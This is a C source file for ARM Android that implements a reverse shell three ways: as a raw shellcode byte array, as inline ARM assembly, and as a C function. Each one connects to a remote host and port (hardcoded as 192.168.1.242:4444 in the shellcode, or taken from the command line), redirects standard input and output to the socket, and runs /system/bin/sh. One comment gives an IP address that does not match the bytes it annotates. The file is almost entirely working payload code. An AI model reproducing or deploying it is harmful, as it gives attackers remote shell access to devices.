#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

void error(char *msg) {
  perror(msg);
  exit(1);
}


char shellcode[] = {
"\x01\x00\x8f\xe2" //	add	r0, pc, #1
"\x10\xff\x2f\xe1" //	bx	r0  
//socket(PF_INET, SOCK_STREAM, 0);
"\x01\x21" // 	mov	r1, #1
"\x00\x22" // 	mov	r2, #0
"\x02\x20" // 	mov	r0, #2
"\xff\x27" // 	mov	r7, #255
"\x1a\x37" // 	add	r7, #26
"\x01\xdf" // 	svc	0
//connect(sock, sockaddr, 0x10);
"\x04\x1c" // 	add	r4, r0, #0
"\x10\x22" // 	mov	r2, #16
"\x09\xa1" // 	add	r1, pc, #36	; (adr r0, 0x8628 <main+8>)
"\xff\x27" // 	mov	r7, #255	; 0xff
"\x1c\x37" // 	add	r7, #28
"\x01\xdf" // 	svc	0
//dup2(sock, stdin);
"\x3f\x27" // 	mov	r7, #63	; 0x3f
"\x20\x1c" // 	add	r0, r4, #0
"\x00\x21" // 	mov	r1, #0
"\x01\xdf" // 	svc	0
//dup2(sock, stdout);
"\x20\x1c" // 	add	r0, r4, #0
"\x01\x21" // 	mov	r1, #1
"\x01\xdf" // 	svc	0
//dup2(sock, stderr);
"\x20\x1c" // 	add	r0, r4, #0
"\x02\x21" // 	mov	r1, #2
"\x01\xdf" // 	svc	0
// execve("/system/bin/sh", args, env)
"\x04\xa1" // 	add	r1, pc, #16
"\x52\x40" // 	eor	r2, r2
"\x05\xa0" // 	add	r0, pc, #20
"\x08\x60" // 	str	r0, [r1, #0]
"\x0b\x27" // 	mov	r7, #11
"\x01\xdf" // 	svc	0

"\x02\x00" // 	.hword	2	// sin_fam: 2
"\x11\x5c" // 	.hword	0x5c11	// port: 4444
"\xc0\xa8\x01\xf2"  //	.byte	192, 168, 1, 242	// ip: 192.168.1.242
"\0\0\0\0"	//	.word	0	// args[0]
"\0\0\0\0" 	//	.word	0	// args[1]
"/system/bin/sh\0"
};

connect_asm() {
  __asm__(
      //socket(PF_INET, SOCK_STREAM, 0);
      "mov	r1, #1\n"
      "mov	r2, #0\n"
      "mov	r0, #2\n"
      "mov	r7, #255\n"
      "add	r7, r7, #26\n"
      "svc	0x00\n"
      //connect(sock, sockaddr, 0x10);
      "add	r4, r0, #0\n"
      "mov	r2, #16\n"
      "add	r1, pc, #36\n"
      "mov	r7, #255\n"
      "add	r7, r7, #28\n"
      "svc	0x00\n"
      //dup2(sock, stdin);
      "mov	r7, #63\n"
      "add	r0, r4, #0\n"
      "mov	r1, #0\n"
      "svc	0x00\n"
      //dup2(sock, stdout);
      "add	r0, r4, #0\n"
      "movs	r1, #1\n"
      "svc	0x00\n"
      //dup2(sock, stderr);
      "add	r0, r4, #0\n"
      "mov	r1, #2\n"
      "svc	0x00\n"
      // execve("/system/bin/sh", args, env)
      "add	r1, pc, #16\n"
      "eor	r2, r2\n"
      "add	r0, pc, #20\n"
      //"str	r0, [r1, #0]\n"
      "eor	r2, r2\n"
      "mov	r7, #11\n"
      "svc 	0x00\n"

      ".hword	2\n"                // sin_fam = 2
      ".hword	0x5c11\n"           // port: 4444
      ".byte	10, 0, 2, 2\n" // ip: 192.168.1.242
      ".word	0\n"                // args
      ".word	0\n"
      ".byte	'/', 's', 'y', 's', 't', 'e', 'm', '/', 'b', 'i', 'n', '/', 's', 'h', 0\n"
      ".align\n"
      );
}

void connect_back(struct sockaddr_in *server) 
{
  //if (setuid(0)) error("setuid failed");
  int sock = socket(PF_INET, SOCK_STREAM, 0);
  if (sock < 0)
    error("socket failed");
  if (connect(sock, (struct sockaddr *) server, sizeof(struct sockaddr_in)))
    error("connect failed");
  if (dup2(sock, STDERR_FILENO) < 0) error("dup2 stderr failed");
  if (dup2(sock, STDOUT_FILENO) < 0) error("dup2 stdout failed");
  if (dup2(sock, STDIN_FILENO) < 0) error("dup2 stdin failed");
  char *args[] = { "/system/bin/sh", NULL};
  execve(args[0], args, NULL);
  error("execve failed");
}

int main(int argc, char *argv[]) {
 
  struct hostent *hp;
  struct sockaddr_in server;
  hp = gethostbyname(argv[1]);
  memcpy((char *) &server.sin_addr, (char *) hp->h_addr, hp->h_length);
  printf("hp_length = %d\n", hp->h_length);
  server.sin_port = htons(atoi(argv[2]));
  server.sin_family = AF_INET;
  //if (argc > 100) 
    connect_back(&server);
  if (argc > 100) 
    connect_asm(); 
  if (argc > 100)
    ((void (*)())(shellcode))();
}

